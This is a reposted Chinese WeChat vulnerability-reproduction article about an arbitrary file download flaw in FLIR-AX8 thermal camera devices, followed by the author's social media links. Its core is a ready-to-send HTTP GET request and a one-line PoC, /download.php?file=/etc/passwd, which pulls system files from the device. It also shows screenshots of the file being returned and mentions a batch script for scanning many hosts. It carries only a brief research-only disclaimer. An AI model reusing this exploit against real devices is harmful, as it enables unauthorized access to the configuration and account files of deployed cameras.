> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ub8eg5NABy61YPxSB0Fu6Q)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3sncnu9SsUErjXu1l0oE45vFroVLzRS6UBe4MfObxHDVYiaSEwcJIVjUEUA/640?wx_fmt=png)

FLIR-AX8 任意文件下载

一、漏洞描述

FLIR-AX8 download.php 存在任意文件下载漏洞，直接访问可下载相关系统配置文件。

二、影响版本  

FLIR-AX8

三、漏洞复现

访问主页：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snceLd3qhHgPMbTSEiaLDw2b73KP9BQfxxrujBfL97SoZGicPf3FbAaTibAA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snclNBlxugkiaYMcuqEibriaLNx2bPmPS7vNlSRyBktnpkzMpqZnqnlPTBvg/640?wx_fmt=png)

详细数据包：

```
GET /download.php?file=/etc/passwd HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

poc：  

```
/download.php?file=/etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3sncOPUhoTJxY9sY2rRaQiaG1MWibLT8ePDoFk7KlozJR2gz1rypTRfnqVJg/640?wx_fmt=png)

直接浏览器访问下载，请求文件  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snczMdicJGibfEXlyggI43r8w27esf2520r9dlYvddjNvhWRMzjibX3rghbw/640?wx_fmt=png)

尝试批量脚本：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snc21PFMeaKchbjBjItU1R7RIA0QMr9FClDjiawefFAtNm5s6Zz0N8icMkg/640?wx_fmt=png)

参考：

http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%8F%B2%E5%8A%9B%E5%B0%94/FLIR-AX8%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.html?h=FLIR-AX8%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)